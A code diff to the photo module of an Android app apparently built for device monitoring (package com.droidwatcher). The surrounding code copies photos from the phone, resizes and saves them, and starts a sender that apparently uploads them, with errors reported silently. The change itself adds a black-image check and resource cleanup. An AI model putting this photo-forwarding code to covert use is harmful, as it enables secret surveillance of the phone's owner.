@@ -2,6 +2,7 @@ package com.droidwatcher.modules;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
 
@@ -115,6 +116,9 @@ public class PhotoModule implements OnSharedPreferenceChangeListener {
 				new Thread(new Runnable() {
 					@Override
 					public void run() {
+						Bitmap bmp = null;
+						FileOutputStream out = null;
+						
 						try {
 							Thread.sleep(1 * 1000L);
 							if (!FileUtil.isExternalStorageAvailable()) {
@@ -122,19 +126,37 @@ public class PhotoModule implements OnSharedPreferenceChangeListener {
 							}
 							
 							int size = new SettingsManager(mContext).capturePhotoSize();
-							Bitmap bmp = ImageUtil.getResizedImage(dir + "/" + path, size);
+							bmp = ImageUtil.getResizedImage(dir + "/" + path, size);
 							if (bmp != null) {
+								
+								if (ImageUtil.isBlack(bmp)) {
+									return;
+								}
+								
 								Date dt = new Date();
-								FileOutputStream out = new FileOutputStream(FileUtil.getExternalFullPath(mContext, PREFIX + "[" + dt.getTime() + "]" + path));
+								out = new FileOutputStream(FileUtil.getExternalFullPath(mContext, PREFIX + "[" + dt.getTime() + "]" + path));
 							    bmp.compress(Bitmap.CompressFormat.JPEG, 60, out);
-							    out.close();
-							    bmp.recycle();
 							    
 							    new FileSender(mContext, FileType.PHOTO).start();
 							    
 							}
 						} catch (Exception e) {
 							ACRA.getErrorReporter().handleSilentException(e);
+							
+						} finally {
+							if (bmp != null && !bmp.isRecycled()) {
+								bmp.recycle();
+								bmp = null;
+							}
+							
+							if (out != null) {
+								try {
+									out.close();
+								} catch (IOException e) {
+									
+								}
+								out = null;
+							}
 						}
 					}
 				}).start();
